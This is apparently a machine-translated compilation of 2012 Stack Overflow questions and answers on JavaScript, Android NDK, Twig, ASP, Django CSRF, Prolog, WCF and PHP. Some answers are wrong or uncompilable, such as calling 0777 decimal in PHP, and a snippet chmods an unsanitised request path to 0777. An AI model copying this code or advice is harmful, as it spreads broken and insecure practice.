        '<param0 xsi:type="xsd:string">ACCOUNT NAME</param0> '+
        '<param1 xsi:type="xsd:string">PASSWORD</param1> '+
         '<param2 xsi:type="xsd:string"></param2> '+
          '<param3 xsi:type="xsd:string"> '+
           "SELECT * from MASTER22 where mrid='16888'</param3> "+
           '</ns1:MRWebServices__search> '+
            '</SOAP-ENV:Body> '+
            '</SOAP-ENV:Envelope>'; 
```

此外，在标题中，我不需要使用 encodeURIComponent()。更正的代码：

```
var headers =
  {
   "SOAPAction" :"MRWebServices#MRWebServices__search"
           }; 
```

# javascript - 在javascript代码中只展开一行

> ID：11820287
> 
> 赞同：1
> 
> 时间：2012-08-05T21:40:06.510
> 
> 标签：javascript

嘿，伙计们在弄清楚如何制作它时遇到了麻烦，这样我就可以让它一次只打开一张桌子，一旦你打开另一张桌子，另一张桌子应该在这里关闭任何帮助？

```
function showRow(cctab){
if (document.getElementById(cctab)) {
    document.getElementById(cctab).style.display = ''; 
}
}

function hideRow(row1){
if (document.getElementById(cctab)) {
    document.getElementById(cctab).style.display = 'none';
}
}

function toggleRow(cctab){
if (document.getElementById(cctab)) {
    if (document.getElementById(cctab).style.display == 'none') {
        showRow(cctab)
    } else {
        hideRow(cctab)
    }
}
} 
```

现在我想让它在我建议 onClick="javascript:toggleRow(cctab);" 之后只打开一个表“cctab” 有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:51:32.840

好吧，您可以保存对先前显示的项目的引用，并在显示另一个项目时将其隐藏：

```
var currentTab;    
function showRow(cctab){
    if (document.getElementById(cctab))
        document.getElementById(cctab).style.display = '';
    if (currentTab && currentTab != cctab)
        hideRow(currentTab);
    currentTab = cctab;
} 
```

请注意，执行内联事件处理程序属性是*1999*年，但假设您出于某种原因坚持使用它，则不需要`javascript:`in `onClick="javascript:toggleRow(cctab);"`。（只是说`onClick="toggleRow(cctab);"`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:02:33.277

首先，您需要将旧行存储在某处。您所拥有的是一个系统，您可以在其中`<element onclick="...">`将当前元素的 id 传递到显示或隐藏行的控制器中。

但是如果你看一下，你缺少的是一种告诉最后一个打开的行是什么的方法。因此，您的代码将需要一个中心对象，或存储旧元素和新元素的变量。

你如何做到这一点取决于你，但如果你做了这样的事情：

```
var table_rows = { current : null /* or set a default */, previous : null };

function rowController (cctab) {
    var newRow = document.getElementById(cctab);

    if (newRow === table_rows.current) { toggleRow(newRow); }
    else {
        table_rows.previous = table_rows.current;
        table_rows.current = newRow;
        showRow(table_rows.current);
        hideRow(table_rows.previous);
    }
} 
```

笔记：

1.  这直接处理元素，因此您不必在函数中执行 getById；这被处理了一次，然后该元素被传递并保存并检查。

2.  它假定点击发生在行本身，而不是行内的任何东西上；
    这是您的代码存在的一个单独问题。
    除非很明显且容易单击行，而不是行内的单元格，否则很难说出您希望用户如何打开和关闭行。
    我的意思是，如果只有表格行有 onclick，并且有人点击表格列，那么 onclick 就不会触发。

# android - 处理android原生活动中的主要命令

> ID：11820289
> 
> 赞同：2
> 
> 时间：2012-08-05T21:40:27.957
> 
> 标签：android, c++, c, native-code, native-activity

在 android 原生活动中，您可以用自己的方法处理来自系统的主要命令。我知道该怎么做，但我不知道我能处理的所有状态。我知道很少有像 APP_CMD_SAVE_STATE、APP_CMD_INIT_WINDOW 这样的状态......但这还不是全部。我在任何地方都找不到状态列表或 android_native_app_glue.h 头文件。有人可以推荐我或用他们的号码和他们打电话的时间写事件列表吗？
谢谢

```
void CMDMethod(struct android_app* app, int32_t state)
{
   switch(state)
   {
     case APP_CMD_SAVE_STANE: //some code
                              break;
     //what can be next cases?
   }
}

void android_main(struct android_app* state)
{
   state->onAppCmd = CMDMethod;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-09-12T02:02:06.203

这是在 android_native_app_glue.h 中找到的枚举

```
enum {

    APP_CMD_INPUT_CHANGED,

    APP_CMD_INIT_WINDOW,

    APP_CMD_TERM_WINDOW,

    APP_CMD_WINDOW_RESIZED,

    APP_CMD_WINDOW_REDRAW_NEEDED,

    APP_CMD_CONTENT_RECT_CHANGED,

    APP_CMD_GAINED_FOCUS,

    APP_CMD_LOST_FOCUS,

    APP_CMD_CONFIG_CHANGED,

    APP_CMD_LOW_MEMORY,

    APP_CMD_START,

    APP_CMD_RESUME,

    APP_CMD_SAVE_STATE,

    APP_CMD_PAUSE,

    APP_CMD_STOP,

    APP_CMD_DESTROY,

}; 
```

APP_CMD_INPUT_CHANGED - 来自主线程的命令：AInputQueue 已更改。处理此命令后，android_app->inputQueue 将更新为新队列（或 NULL）。

APP_CMD_INIT_WINDOW - 来自主线程的命令：一个新的 ANativeWindow 已准备好使用。收到此命令后，android_app->window 将包含新的窗口表面。

APP_CMD_TERM_WINDOW - 来自主线程的命令：需要终止现有的 ANativeWindow。收到此命令后，android_app->window 仍然包含现有窗口；调用 android_app_exec_cmd 后，它将被设置为 NULL。

APP_CMD_WINDOW_RESIZED - 来自主线程的命令：当前 ANativeWindow 已调整大小。请用它的新尺寸重新绘制。

APP_CMD_WINDOW_REDRAW_NEEDED - 来自主线程的命令：系统需要重绘当前的 ANativeWindow。您应该在将其交给 android_app_exec_cmd() 之前重绘窗口，以避免暂时的绘图故障。

APP_CMD_CONTENT_RECT_CHANGED - 来自主线程的命令：窗口的内容区域已更改，例如显示或隐藏软输入窗口。您可以在 android_app::contentRect 中找到新的内容矩形。

APP_CMD_GAINED_FOCUS - 来自主线程的命令：应用程序的活动窗口已获得输入焦点。

APP_CMD_LOST_FOCUS - 来自主线程的命令：应用程序的活动窗口失去了输入焦点。

APP_CMD_CONFIG_CHANGED - 来自主线程的命令：当前设备配置已更改。

APP_CMD_LOW_MEMORY - 来自主线程的命令：系统内存不足。尽量减少内存使用。

APP_CMD_START - 来自主线程的命令：应用程序的活动已启动。

APP_CMD_RESUME - 来自主线程的命令：应用程序的活动已恢复。

APP_CMD_SAVE_STATE - 来自主线程的命令：应用程序应该为自己生成一个新的保存状态，如果需要可以从以后恢复。如果你有保存状态，用 malloc 分配它并将它放在 android_app.savedState 中，大小在 android_app.savedStateSize 中。稍后将为您释放。

APP_CMD_PAUSE - 来自主线程的命令：应用程序的活动已暂停。

APP_CMD_STOP - 来自主线程的命令：应用程序的活动已停止。

APP_CMD_DESTROY - 来自主线程的命令：应用程序的活动正在被销毁，并等待应用程序线程清理并退出，然后再继续。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:43:19.147

[我想我在这本书http://www.packtpub.com/android-ndk-beginners-guide/book](http://www.packtpub.com/android-ndk-beginners-guide/book)中看到了一些相关内容。但可能是错误的。那里肯定有一章是关于创建一个完全原生的活动，该循环处理所有这些状态。

# ruby-on-rails-3 - 使用 i18n 进行炼油厂 CMS 查询 - 路由错误

> ID：11820291
> 
> 赞同：0
> 
> 时间：2012-08-05T21:40:45.473
> 
> 标签：ruby-on-rails-3, internationalization, refinerycms

我正在尝试将 i18n 添加到 Refinery CMS，并添加了 Inquiries gem。一切都很好，直到我添加用于切换语言环境的链接，如下所示：

```
= link_to_unless_current image_tag('flag_bulgaria.png'), locale: "bg" 
```

然后出现路由错误：

没有路线匹配 {:locale=>"bg", :controller=>"refinery/inquiries/inquiries", :action=>"new"}

我添加了炼油厂-I18n gem，还在初始化文件中添加了语言环境。我试图在过滤器之前添加用于在 application_controller 中设置语言环境，但没有结果。我已经阅读了所有关于炼油厂 i18n 的讨论，但没有发现任何关于这个问题的信息。我正在使用 rails 3.2.6 ，refinery cms 2.0.4 ，refinerycms-inquiries 2.0.3 。

感谢你们对我的帮助 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T23:34:58.763

请记住`refinery.url_for`在您的链接中使用。这是我的语言选择器。

```
 <ul id="menu1" class="dropdown-menu" role="menu" aria-labelledby="drop4">
        <% Refinery::I18n.frontend_locales.each do |frontend_locale| %>
            <li>
              <%= link_to Refinery::I18n.locales[frontend_locale], refinery.url_for(:locale => frontend_locale) %>
            </li>
        <% end %>
      </ul> 
```

# internet-explorer - Internet Explorer 和 Chrome 将我的软件识别为病毒

> ID：11820295
> 
> 赞同：0
> 
> 时间：2012-08-05T21:41:14.853
> 
> 标签：internet-explorer, google-chrome, malware-detection

我开发了一个不错的软件，我想在线发布它，我制作了一个不错的网站供下载，但似乎 Internet Explorer 和 Chrome 将我的软件识别为病毒并向用户发布下载警告如何安装它，我认为它正在为微软资源管理器使用 SmartScreen 并且 chrome 浏览器信息说[这个信息](https://support.google.com/chrome/bin/answer.py?hl=en&hlrm=iw&p=ib_download_scan&answer=99020)

谁能建议我该怎么做？如何让我的软件下载获得批准？

我是开发新手，所以如果这是一个愚蠢的问题，我很抱歉......

谢谢你们

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:52:51.987

由于没有数字签名，浏览器认为它是恶意软件。您使用的是哪个 IDE？如果是 Visual Studio，这个选项是现成的。使用公司名称对您的软件进行数字签名，如“个人”或“测试”或“下载”或其他。

如果您使用的是其他 IDE，您可以随时在 Google 上下载一些内容，然后对软件进行数字签名。完成此步骤后，大多数浏览器和防病毒软件不会将您的软件归类为恶意软件。

PS您可能需要使用数字签名软件创建一个帐户。如果使用 VS，它还会要求您提供更多凭据。

干杯!

# php - Twig 三元运算符，简写 if-then-else

> ID：11820297
> 
> 赞同：176
> 
> 时间：2012-08-05T21:41:54.057
> 
> 标签：php, twig, conditional-operator

Twig 是否支持三元（速记 if-else）运算符？

我需要一些条件逻辑，例如：

```
{%if ability.id in company_abilities %}
    <tr class="selected">
{%else%}
    <tr>
{%endif%} 
```

但在 Twig 中使用速记。

* * *

## 回答 #1

> 赞同：338
> 
> 时间：2012-08-05T21:51:14.693

```
{{ (ability.id in company_abilities) ? 'selected' : '' }} 
```

三元运算符记录在“[其他运算符](https://twig.symfony.com/doc/3.x/templates.html#:%7E:text=%3F%3A%3A%20The%20ternary%20operator,as%20%7B%7B%20foo%20%3F%20%27yes%27%20%3A%20%27%27%20%7D%7D)”下

* * *

## 回答 #2

> 赞同：131
> 
> 时间：2014-07-21T07:32:28.877

从 Twig 1.12.0 开始，您可以使用速记语法

```
{{ foo ?: 'no' }} is the same as {{ foo ? foo : 'no' }}
{{ foo ? 'yes' }} is the same as {{ foo ? 'yes' : '' }} 
```

* * *

## 回答 #3

> 赞同：103
> 
> 时间：2016-11-15T09:11:40.307

**Twig 1.12.0**添加了对扩展三元运算符的支持。

1.  如果`foo`回`yes`显，则回显`no`：

    ```
    {{ foo ? 'yes' : 'no' }} 
    ```

2.  如果`foo`回显它，否则回显`no`：

    ```
    {{ foo ?: 'no' }} 
    ```

    或者

    ```
    {{ foo ? foo : 'no' }} 
    ```

3.  如果`foo`echo `yes`else 不回显：

    ```
    {{ foo ? 'yes' }} 
    ```

    或者

    ```
    {{ foo ? 'yes' : '' }} 
    ```

4.  `foo`如果它已**定义**且不为**null**，则返回 的值，`no`否则：

    ```
    {{ foo ?? 'no' }} 
    ```

5.  `foo`如果已**定义**，则返回值（**空**值也计算在内），`no`否则：

    ```
    {{ foo|default('no') }} 
    ```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-03-31T02:39:40.487

例如，如果数据库中存在价格，则 print (Price is $$$) else print (Not Available)`~`和`Twig`.

```
{{ Price is defined ? 'Price is '~Price : 'Not Available' }} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-08-10T09:48:10.480

我只是用作`a`通用变量名。如果其他情况像这样，您也可以使用无穷无尽：

```
{{ a == 1 ? 'first' : a == 2 ? 'second' : 'third' }} 
```

# datetime - 距离工作日或日期还有多长时间

> ID：11820298
> 
> 赞同：0
> 
> 时间：2012-08-05T21:42:14.253
> 
> 标签：datetime, asp-classic, time, weekday

我想知道`Weekday`从`Now`. 我到处搜索，但找不到任何东西。

我认为我必须以某种方式将`DateDiff`-function 与 -function 一起使用`WeekDay`。

**场景是：**

我有`varWeekDay`一周中的一天的变量，例如：1 / 2 / 3 / 4 / 5 / 6 / 7

还有一个`varStartTime`带有一天中时间的变量：hh:mm

最后一个变量`varStopTime`也带有一天中的时间：hh：mm

```
if varWeekday = Weekday(now, 2) and varStartTime < formatdatetime(now, 4) then
  .... Write how long time till start in hours / minutes
elseif varWeekday = Weekday(now, 2) and varStartTime >= formatdatetime(now, 4) and varStopTime < formatdatetime(now, 4) then
  response.write("Already started!")
else
  .... Write how long time till start in days / hours / minutes
end if 
```

“多长时间”可以是：“从现在起 2 天 3 小时 27 分钟”

应从特定日期时间生成相同的输出。例如：06/08/2012 23:55 是“从现在开始 1 天 13 分钟”

我真的希望你们能帮忙！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T05:05:09.750

我不完全了解您需要的开始时间和结束时间，但是此脚本会告诉您从现在到一周中特定日期的开始之间有多少时间。

```
<%
Dim varNow : varNow = Now()
Dim varWeekday : varWeekday = 7 'This is the weekday to look for (1 is Sunday, 7 is Saturday)

'This next line sets the time to the start of the day
Dim varThisDate : varThisDate = DateSerial(Year(varNow), Month(varNow), Day(varNow))
Dim varThisWeekday
Do
    varThisDate = DateAdd("d", 1, varThisDate)
    varThisWeekday = Weekday(varThisDate)
    If varThisWeekday = varWeekday Then
        Exit Do
    End If
Loop

'These next lines just convert and display the remaining time into the different units
Response.Write("Until next " & WeekdayName(varWeekday) & "<br />")

Dim varSeconds : varSeconds = DateDiff("s", varNow, varThisDate)
Dim varDays : varDays = Int(varSeconds / 60 / 60 / 24)
varSeconds = varSeconds - (varDays * 24 * 60 * 60)
Dim varHours : varHours = Int(varSeconds / 60 / 60)
varSeconds = varSeconds - (varHours * 60 * 60)
Dim varMinutes : varMinutes = Int(varSeconds / 60)
varSeconds = varSeconds - (varMinutes * 60)

Response.Write("Days: " & varDays & "<br />")
Response.Write("Hours: " & varHours & "<br />")
Response.Write("Minutes: " & varMinutes & "<br />")
Response.Write("Seconds: " & varSeconds & "<br />")
%> 
```

# c# - 新手 Linq to SQL 映射到 POCO 的正确方法？

> ID：11820300
> 
> 赞同：2
> 
> 时间：2012-08-05T21:42:35.563
> 
> 标签：c#, linq, linq-to-sql

有点尴尬，我想问/确定将 Linq-To-SQL 查询映射到 POCO 的最佳方法。我目前无法使用 EF，所以坚持使用 Linq-To-SQL。

到目前为止，我有一个简单的类，如下所示：

```
public class DiaryEvent
{
    public Int64 ID { get; set; }
    public string ResourceCalendarID { get; set; }
    public string EventTitle { get; set; }
    public string Location { get; set; }
    public DateTime StartDate { get; set; }
    public DateTime EndDate { get; set; }
    public string Description { get; set; }
    public string ResourceColour { get; set; }
    public bool AllDay { get; set; }
} 
```

我的 Linq-to-SQL (LTS) 查询如下：

```
DataClassesDataContext db = new DataClassesDataContext();
var qry =
         from b in db.bookings
         select b 
```

因为数据库表 bookings 不是/不能完全按照我的 DiaryEvent 类创建，所以我目前正在迭代 b ，例如：

```
List<DiaryEvent> EventList = new List<DiaryEvent>();
foreach (booking item in qry)
{
    EventList.Add(new DiaryEvent
    {
        AllDay = false,
        Description = item.bookingDescription,
        ID = item.bookingID,
        StartDate = (DateTime)item.startDate,
        EndDate = (DateTime)item.endDate,
        EventTitle = item.bookingName,
        Location = item.bookingLocation,
        ResourceCalendarID = item.resourceID.ToString(),
        ResourceColour = item.bookingColour.Trim()
    });
} 
```

这可以正确映射我的数据，但是我不确定这是否是实现这一目标的最快/最正确的方法？如果有任何反馈可以确认上述技术是否可以接受，或者是否有改进的方法，我将不胜感激？

PS：公平地说，不会有大量数据要检索..在任何给定情况下可能只有几百行。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T22:08:06.997

除非我误解了某些东西，否则您可以将代码简化为如下所示：

```
var EventList = (from b in db.bookings
                select new DiaryEvent
                {
                    AllDay = false,
                    Description = b.bookingDescription,
                    ID = b.bookingID,
                    StartDate = (DateTime)b.startDate,
                    EndDate = (DateTime)b.endDate,
                    EventTitle = b.bookingName,
                    Location = b.bookingLocation,
                    ResourceCalendarID = b.resourceID.ToString(),
                    ResourceColour = b.bookingColour.Trim()
                }).ToList(); 
```

结果几乎是相同的，但它使您不必使用 foreach。

# android - Android图像捕获强制关闭

> ID：11820303
> 
> 赞同：0
> 
> 时间：2012-08-05T21:43:00.683
> 
> 标签：android, image, capture

当我从相机捕捉图像然后使用加载它

```
 startActivityForResult(intent, RESULT_LOAD_IMAGE); 
```

使用 HTC one 它工作正常，但使用大型手机 .. 像 S2 应用程序崩溃（前关闭）

这是我的相机功能代码

```
 btnCamera.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {

            Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
            MpClick.start();
            startActivityForResult(intent, RESULT_LOAD_IMAGE);
        }
    }); 
```

如何解码图像使其更小并且不关闭或缩放图像？

更新 - -

```
 btnCamera.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {

            Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
            startActivityForResult(intent, RESULT_LOAD_IMAGE);
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inSampleSize = 1;
            options.inPurgeable = true;
            options.inInputShareable = true;
        }
    }); 
```

仍然不起作用..任何人都有其他解决方案来减小图像大小，因此它不会强制关闭

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T07:05:16.883

所有问题都是 Galaxy S2 手机的问题..

所以没有解决办法，但该应用程序在所有其他手机上运行良好..

谢谢大家

# django - django 的零星 403“CSRF FAILURECSRF cookie 未设置”错误

> ID：11820307
> 
> 赞同：5
> 
> 时间：2012-08-05T21:43:20.843
> 
> 标签：django, http-status-code-403, django-1.4, django-csrf

我们有一个刚刚开始向外界开放的小网站。在大多数情况下，它运行良好，但我们偶尔会收到来自其中一种表单的消息“CSRF FAILURECSRF cookie not set”的 403 错误。表单肯定`{% csrf_token %}`包含在内，我们的中间件如下所示：

```
MIDDLEWARE_CLASSES = (
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
) 
```

该表格对大多数人都适用，但我大约每天都会收到一封包含失败案例的电子邮件。电子邮件包含实际请求，如下所示（我已经删除了其余的 POST 数据以隐藏私有数据，但留下了 csrfmiddlewaretoken）：

```
<WSGIRequest
path:/main/10/apply/,
GET:<QueryDict: {}>,
POST:<QueryDict: {u'csrfmiddlewaretoken': [u'IQQZvbVIggJm6Be6VinPHj8Qn3i3TdmG']}>,
COOKIES:{},
META:{'CONTENT_LENGTH': '111978',
 'CONTENT_TYPE': 'multipart/form-data; boundary=----WebKitFormBoundaryLyo9BPXnAwKnt8ew',
 'CSRF_COOKIE': 'XmSPWJZk2UwS4PNBXRmVlAaYDDdNaGqk', 
```

CSRF_COOKIE 与 csrfmiddlewaretoken 不匹配，我假设这是导致问题的原因，但我无法弄清楚这些提交是如何不同步的，而其他提交则不然。该页面是一个非常简单的表单，只有几个字段。

关于我应该在哪里看的任何建议？我通过 apache 使用 mod_wsgi 在 CentOS 上运行最新的 Django 1.4.1。

**编辑：**与成功的请求相比，唯一看起来奇怪的另一件事是这里的`COOKIES:{}`部​​分是空的，这会让我怀疑他们可能只是在浏览器中禁用了 cookie，但是为什么它会出现在 CSRF_COOKIE 中元部分？

谢谢你的帮助！

布兰登

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-24T19:39:47.707

HTTP_COOKIE 也是空白的吗？

可能是 django 在请求中没有看到 CSRF 令牌 cookie，它正在生成一个*新*的CSRF_COOKIE 并将其放入 meta 中。

# prolog - Prolog 四种扑克

> ID：11820309
> 
> 赞同：1
> 
> 时间：2012-08-05T21:43:28.117
> 
> 标签：prolog

我正在尝试使用 Prolog 编写扑克游戏。我知道如何编写皇家同花顺，但我的四类代码不起作用。

我有以下代码：

```
four_of_a_kind(R):-
member(card(V, T1), R),
member(card(V, T2), R),
member(card(V, T3), R),
member(card(V, T4), R). 
```

其中 V 是我想要相同的等级，T1,T2,T3,T4 是西装。R是我的卡片清单。

谁能解释如何在序言中编写四种类型的代码并解释我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:06:08.923

您的问题是**您一直在搜索整手牌，**而 T1、T2.. 是自由变量，所以

```
member(card(V, T1), R),
... 
```

**用同一张卡片统一 4 次**，four_of_a_kind 总是返回 true。

解决方案：只需锁定西装。

代码：

```
is_card(X,Y) :-
    number(X), between(1,13,X),
    member(Y, [c,d,h,s]). /* clubs, diamonds, hearts and spades */

four_of_a_kind(R) :-
    member(card(V,c), R),
    member(card(V,d), R),
    member(card(V,h), R),
    member(card(V,s), R), !. 
```

一些查询：

```
?- four_of_a_kind([card(7,c), card(7,d), card(7,h), card(9,s), card(7,s)]).
true.

?- four_of_a_kind([card(7,c), card(7,d), card(9,h), card(9,s), card(7,s)]).
false. 
```

# ios - 使用 LibMusicXML 在 IOS 中创建 musicXML 浏览器

> ID：11820312
> 
> 赞同：10
> 
> 时间：2012-08-05T21:43:54.573
> 
> 标签：ios, musicxml

LibMusicXML：有没有人有任何在 IOS 项目中使用这个库的例子？想用它来查看musicXML格式的乐谱。

关于添加 C++ 库以及如何在 IOS 中使用此库显示 musicXML 的建议将不胜感激？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-01-18T22:34:31.257

通过四处搜索 - 似乎有这个代码库 AscoGraph [https://github.com/k4rm/AscoGraph](https://github.com/k4rm/AscoGraph)

# c# - 如何在日程表中生成缺失的日期？

> ID：11820313
> 
> 赞同：0
> 
> 时间：2012-08-05T21:44:13.853
> 
> 标签：c#

我有一个只包含一周训练（31 次锻炼）的时间表，现在我需要生成其余的锻炼，直到时间表结束（例如 20120601-20120831）。所以我想也许循环锻炼并将 addDays(7) 放在所有锻炼日期上。

我曾尝试使用 foreach 和 a for，但无法使其正常工作。

我的 GenerateSchedule 方法：

```
public ActionResult GenerateSchedule(int scheduleId)
    {
        //get schedule included list of 31 workouts
        //only added one week on workouts
        var schedule = _scheduleServices.GetSchedule(scheduleId);
        var workouts = schedule.Workouts.ToList();
        int i = 0;
        for(var day = schedule.FromDate; day.Date <= schedule.ToDate; day =  day.AddDays(1))
        {
            foreach (var workout in workouts)
            {

            }

            var newWorkout = new WorkoutFormModel
            {
                ScheduleId = workouts[i].ScheduleId,
                Date = workouts[i].Date.AddDays(7),
                StartTime = workouts[i].StartTime,
                EndTime = workouts[i].EndTime,
                InstructorId = workouts[i].Instructor.Id,
                CourseId = workouts[i].Course.Id,
            };

            i++;
            _workoutServices.AddWorkout(newWorkout);
        }

        /*
        foreach(var workout in schedule.Workouts)
        {
            if (workout.Date.AddDays(7) <= schedule.ToDate)
            {
                var newWorkout = new WorkoutFormModel
                                     {
                                         ScheduleId = workout.ScheduleId,
                                         Date = workout.Date.AddDays(7),
                                         StartTime = workout.StartTime,
                                         EndTime = workout.EndTime,
                                         InstructorId = workout.Instructor.Id,
                                         CourseId = workout.Course.Id,

                                     };
                _workoutServices.AddWorkout(newWorkout);
            }
        }*/

        return RedirectToAction("Overview", new { scheduleId });
    } 
```

更新：

```
 private static List<WorkoutFormModel> ExtendSchedule(Schedule schedule)
    {
        var workoutList = new List<WorkoutFormModel>();

        for (var workoutStart = schedule.FromDate; workoutStart <= schedule.ToDate; workoutStart = workoutStart.AddDays(7))
        {

            workoutList.AddRange(schedule.Workouts.Select(Workout => new WorkoutFormModel
            {
                ScheduleId = schedule.Id,
                Date = workoutStart.Add(Workout.WeekOffset),
                StartTime = Workout.StartTime,
                EndTime = Workout.EndTime,

                Course = Workout.Course
            }));
        }

        return workoutList;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:47:50.803

`DateTime`是[不可变](http://en.wikipedia.org/wiki/Immutable_object)的。也就是说，`AddDays()`返回 的新实例`DateTime`，而您调用它的实例保持不变。所以你的循环可能看起来像这样：

```
for(var day = schedule.FromDate; day.Date <= schedule.ToDate; day = day.AddDays(1)) 
```

**编辑**：既然我们同意这更像是一个设计问题，我建议这样做：

*   编写以下辅助函数，尽可能明确地说明其输入：

    ```
    private List<WorkoutFormModel> ExtendSchedule(Schedule schedule, IEnumerable<WorkoutInfo> oneWeekWorkouts)
    {
        var workoutList = new List<WorkoutFormModel>();
        foreach (var workoutStart = schedule.FromDate; workoutStart <= schedule.ToDate; workoutStart = workoutStart.AddDays(7))
        {
            workoutList.AddRange(oneWeekWorkouts.Select(workout => new WorkoutFormModel
                                 {
                                     ScheduleId = schedule.Id,
                                     Date = workoutStart.Add(workout.WeekOffset),
                                     StartTime = ?,
                                     EndTime = ?,
                                     InstructorId = workout.Instructor.Id,
                                     CourseId = workout.Course.Id
                                 }));
        }

        return workoutList;
    } 
    ```

    `WorkoutInfo`代表锻炼的类在哪里。我将它命名为不同的名称，以便它不会与您使用的类型发生冲突，但与列表中的项目基本相同`Schedule.Workouts`。主要区别在于，在 my 中`WorkoutInfo`，您不会保留将要进行锻炼的特定时间点，而是以会员的形式从一周开始的**偏移量**。如您所见，使用这种表示形式，将一周的计划扩展到整个日程安排要简单得多。`TimeSpan``WeekOffset`

由您来填补空白并将我的提议与您的代码库保持一致。也许你会想要创建这个新`WorkoutInfo`类，也许最好将它与你现有的`Workout`类合并，这取决于你项目的整体情况。

如果您遇到更多困难，请告诉我。

# asp.net - WCF 使用 Web 服务

> ID：11820316
> 
> 赞同：2
> 
> 时间：2012-08-05T21:44:47.897
> 
> 标签：asp.net, wcf

新手来了 不知道如何问更不用说正确使用正确的术语了。这是我第一次使用服务器、Web 服务和 WCF。我在 VB.net 中做这一切。

我的任务是编写一个从客户端接收短信响应的服务器。客户端提供了一个 asmx webservice（我认为）。

我有一台服务器正在运行，使用 WCF 实现，我认为它已正确设置并等待它收到某种消息，但它从未收到。

然后我开始做更多的研究，发现 WCF 有一些遗留代码可以让你使用 web 服务（我相信 httpbinding）。

我将如何准确地实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T17:54:13.293

作为一个菜鸟，试图理解所有部分如何组合在一起真的很困难。最好的办法是浏览几个 WCF noobie 教程。快速谷歌搜索“开发你的第一个 wcf”给出了一些有希望的结果：

[Windows Communication Foundation 初学者指南](http://msdn.microsoft.com/en-us/netframework/first-steps-with-wcf.aspx)

[创建和使用您的第一个 WCF 服务](http://www.codeproject.com/Articles/42643/Creating-and-Consuming-Your-First-WCF-Service)

祝你好运

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-06T18:38:08.027

目前还不清楚您要完成什么，但我将介绍我能做些什么来帮助指导您弄清楚您要完成什么。

# 调用第三方端点

如果您只是尝试使用第三方 Web 服务，则可以使用 svcutil（或 Visual Studio 中的添加服务引用）生成代理类以连接到第三方。WSDL.exe 自 .NET 框架 1.1 以来一直存在，而 svcutil.exe 在 .NET 3.5 中出现。两者的主要区别在于 svcutil.exe 支持 wsdl.exe 无法支持的功能（如 WS-RM）。

如果最终目标只是使用第三方服务，那么 svcutil.exe 或使用 Visual Studio 中的“添加服务引用”选项将完成您需要做的一切。它使用作为 WCF 的一部分创建的类这一事实并不重要。

# 定义一个端点供第三方调用

如果第三方需要向您发送数据，并且数据需要实时发送（而不是批量发送），那么 WCF 是当今首选的解决方案之一，如果您使用 .NET 语言进行编程（您也可以使用 ASMX服务，创建一个 http 处理程序等）。如果这是实际要求，那么他们提供的 WSDL 可能是他们希望您创建的端点看起来像的规范（他们想要使用的合同）。这是当时可能采取的步骤的示例：

1.  根据提供的 WSDL 创建服务契约。
2.  从步骤 1 创建一个实现合同的类。
3.  使用适当的测试数据自行部署和测试服务。
4.  测试您是否可以通过外部 Internet 连接使用端点(1)(2)
5.  让客户端知道端点已准备好供他们测试。

希望这可以让您对您应该考虑的内容以及接下来的步骤有一个高层次的概述。

(1) 如果它是您组织内部的客户端，那么测试只需要来自您的内部网络

(2)如果客户在您的组织之外，您将需要研究 WCF 安全性。您不希望任何人都能达到您的端点。

# php - PHP chmod 函数不起作用

> ID：11820324
> 
> 赞同：0
> 
> 时间：2012-08-05T21:45:57.067
> 
> 标签：php, file-upload, centos, chmod, umask

一个不会工作的问题。

我有一个 XHR 文件上传到一个目录。用户在执行 php 代码的站点上按下一个按钮。在该代码上，我放置了函数`chmod($file_name, 0777);`。不要介意安全问题，但这不起作用。我很困惑。

```
<?php
$file_name = $_REQUEST["file_name"];
chmod($file_name, 0777);
?> 
```

javascript 发送文件名，我回显变量以获得正确的值。那不是问题。

```
$("#csv_dedupe").live("click", function(e) {
    file_name = 'http://hidden/files/' + $("#IMEXp_import_var-uploadFile-file").val();
    $.post($_CFG_PROCESSORFILE, {"task": "csv_dupe", "file_name": file_name}, function(data) {
        alert(data);
    }, "json")
}); 
```

我尝试了其他解决方案，例如更改 /etc/profile 和 /etc/bashrc 中的 umask 并重新启动，但它不起作用。我尝试这些的原因是因为最终我只想更改目录的默认 chmod。

我在虚拟 centos 服务器上运行。它的灯。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:46:49.003

您使用的是十进制文字而不是八进制文字。

```
chmod($file_name, 0777); 
```

# objective-c - 通过子类化和覆盖 initWithFrame 自定义 UITabBar（背景图像）

> ID：11820325
> 
> 赞同：0
> 
> 时间：2012-08-05T21:45:59.843
> 
> 标签：objective-c, uitabbar

似乎有很多不同的方法可以改变 UITabBar 的外观。我发现在 iOS 5 中，UITabBar 有了新的属性，例如`backgroundImage`. 但是，我如何以及在哪里设置它？

我想继承 UITabBar 并覆盖该`initWithFrame`方法，设置背景图像。

